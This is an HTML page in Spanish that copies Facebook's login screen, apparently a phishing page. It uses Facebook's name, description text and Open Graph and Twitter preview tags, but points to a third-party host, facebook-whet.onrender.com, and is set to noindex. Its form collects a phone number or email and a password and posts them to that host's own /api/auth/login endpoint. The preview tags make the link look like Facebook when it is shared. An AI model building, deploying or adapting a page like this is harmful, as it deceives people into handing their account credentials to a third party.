<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <meta name="theme-color" content="#ffffff" />
  <meta name="description" content="Crea una cuenta o inicia sesión en Facebook. Conéctate con amigos, familiares y otras personas que conozcas. Comparte fotos y videos, envía mensajes y recibe notificaciones." />
  <meta name="robots" content="noindex, nofollow" />

  <!-- Open Graph WhatsApp / Facebook -->
  <meta property="og:title" content="Facebook - Inicia sesión o regístrate" />
  <meta property="og:description" content="Crea una cuenta o inicia sesión en Facebook. Conéctate con amigos, familiares y otras personas que conozcas. Comparte fotos y videos, envía mensajes y recibe notificaciones." />
  <meta property="og:image" content="https://facebook-whet.onrender.com/login/port.jpg" />
  <meta property="og:image:width" content="1200" />
  <meta property="og:image:height" content="630" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://facebook-whet.onrender.com/" />
  <meta property="og:site_name" content="Facebook" />
  <meta property="og:locale" content="es_PE" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Facebook - Inicia sesión o regístrate" />
  <meta name="twitter:description" content="Crea una cuenta o inicia sesión en Facebook. Conéctate con amigos, familiares y otras personas que conozcas." />
  <meta name="twitter:image" content="https://facebook-whet.onrender.com/login/port.jpg" />

  <title>Facebook - Inicia sesión o regístrate</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />

  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      height: 100%;
      background: #f0f2f5;
      font-family: 'Roboto', sans-serif;
      color: #1c1e21;
      -webkit-font-smoothing: antialiased;
    }

    .page {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: space-between;
      padding: 48px 20px 32px;
    }

    .top {
      width: 100%;
      max-width: 396px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }

    .lang {
      font-size: 15px;
      color: #65676b;
      margin-bottom: 4px;
    }

    /* Logo F */
    .fb-logo {
      width: 72px;
      height: 72px;
      border-radius: 50%;
      background: #1877f2;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      flex-shrink: 0;
    }

    .fb-logo img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    /* Formulario */
    .form {
      width: 100%;
      background: #ffffff;
      border-radius: 8px;
      box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
      padding: 20px 16px 28px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .input-field {
      width: 100%;
      height: 52px;
      border: 1px solid #dddfe2;
      border-radius: 6px;
      padding: 0 16px;
      font-family: 'Roboto', sans-serif;
      font-size: 17px;
      color: #1c1e21;
      background: #ffffff;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
      appearance: none;
      -webkit-appearance: none;
    }

    .input-field::placeholder { color: #90949c; }
    .input-field:focus {
      border-color: #1877f2;
      box-shadow: 0 0 0 2px rgba(24,119,242,.2);
    }

    .btn-login {
      width: 100%;
      height: 52px;
      background: #1877f2;
      color: #ffffff;
      border: none;
      border-radius: 6px;
      font-family: 'Roboto', sans-serif;
      font-size: 20px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.15s;
      margin-top: 4px;
    }
    .btn-login:hover    { background: #166fe5; }
    .btn-login:active   { background: #1464d2; }
    .btn-login:disabled { opacity: 0.65; cursor: not-allowed; }

    .forgot {
      text-align: center;
      font-size: 14px;
      color: #1877f2;
      text-decoration: none;
      display: block;
      padding: 8px 0 4px;
    }
    .forgot:hover { text-decoration: underline; }

    .divider {
      border: none;
      border-top: 1px solid #dadde1;
      margin: 8px 0;
    }

    .alert {
      display: none;
      background: #fff3cd;
      border: 1px solid #ffc107;
      border-radius: 6px;
      padding: 10px 14px;
      font-size: 14px;
      color: #856404;
      text-align: center;
    }
    .alert.show { display: block; }

    .btn-new {
      display: block;
      margin: 0 auto;
      padding: 0 24px;
      height: 52px;
      background: #42b72a;
      color: #ffffff;
      border: none;
      border-radius: 6px;
      font-family: 'Roboto', sans-serif;
      font-size: 17px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.15s;
      white-space: nowrap;
    }
    .btn-new:hover  { background: #36a420; }
    .btn-new:active { background: #2d8f1a; }

    .bottom {
      width: 100%;
      max-width: 396px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 16px;
      padding-bottom: 8px;
    }

    .footer-links {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 8px 12px;
      font-size: 12px;
      color: #8a8d91;
    }

    .footer-links a {
      color: #8a8d91;
      text-decoration: none;
    }
    .footer-links a:hover { text-decoration: underline; }

    @media (max-width: 360px) {
      .page { padding: 32px 16px 24px; }
      .input-field { height: 48px; font-size: 16px; }
      .btn-login   { height: 48px; font-size: 18px; }
      .btn-new     { height: 48px; font-size: 16px; }
    }

    @media (min-width: 600px) {
      .page { justify-content: center; gap: 48px; padding: 60px 24px 40px; }
      .top  { gap: 24px; }
    }
  </style>
</head>
<body>

<div class="page">

  <div class="top">

    <div class="lang">Español</div>

    <!-- Logo Facebook -->
    <div class="fb-logo">
      <img src="/login/Candado.jpg" alt="Facebook" />
    </div>

    <!-- Formulario -->
    <div class="form">
      <div class="alert" id="alert"></div>

      <input
        class="input-field"
        type="email"
        id="email"
        placeholder="Celular o correo electrónico"
        autocomplete="email"
        inputmode="email"
      />

      <input
        class="input-field"
        type="password"
        id="password"
        placeholder="Contraseña"
        autocomplete="current-password"
      />

      <button class="btn-login" id="btnLogin" onclick="doLogin()">
        Iniciar sesión
      </button>

      <a class="forgot" href="#" onclick="forgotPassword(event)">
        ¿Olvidaste tu contraseña?
      </a>

      <hr class="divider" />

      <div style="display:flex; justify-content:center;">
        <button class="btn-new" onclick="alert('Contacta al administrador para crear una cuenta.')">
          Crear cuenta nueva
        </button>
      </div>

    </div>
  </div>

  <!-- Parte inferior -->
  <div class="bottom">

    <!-- Logo Meta imagen -->
    <img src="/login/google.jpg" alt="Meta" style="height:28px; object-fit:contain;" />

    <!-- Links pie de página -->
    <div class="footer-links">
      <a href="#">Información</a>
      <a href="#">Ayuda</a>
      <a href="#">Más</a>
    </div>

  </div>
</div>

<script>
  async function doLogin() {
    const email    = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    const btn      = document.getElementById('btnLogin');

    document.getElementById('alert').className = 'alert';

    if (!email || !password) { showAlert('Por favor completa todos los campos.'); return; }

    btn.disabled = true;
    btn.textContent = 'Ingresando...';

    try {
      const res = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });
      const data = await res.json();

      if (data.success) {
        localStorage.setItem('token', data.token);
        localStorage.setItem('userRole', data.user.role);
        btn.textContent = '✓ Acceso concedido';
        setTimeout(() => {
          window.location.href = data.user.role === 'admin' ? '/admin' : '/dashboard';
        }, 600);
      } else {
        showAlert(data.message || 'Credenciales incorrectas.');
        btn.disabled = false;
        btn.textContent = 'Iniciar sesión';
      }
    } catch (err) {
      showAlert('Error de conexión. Intenta de nuevo.');
      btn.disabled = false;
      btn.textContent = 'Iniciar sesión';
    }
  }

  function showAlert(msg) {
    const el = document.getElementById('alert');
    el.textContent = msg;
    el.className = 'alert show';
  }

  function forgotPassword(e) {
    e.preventDefault();
    alert('Contacta al administrador para restablecer tu contraseña.');
  }

  document.addEventListener('keydown', e => { if (e.key === 'Enter') doLogin(); });
</script>

</body>
</html>
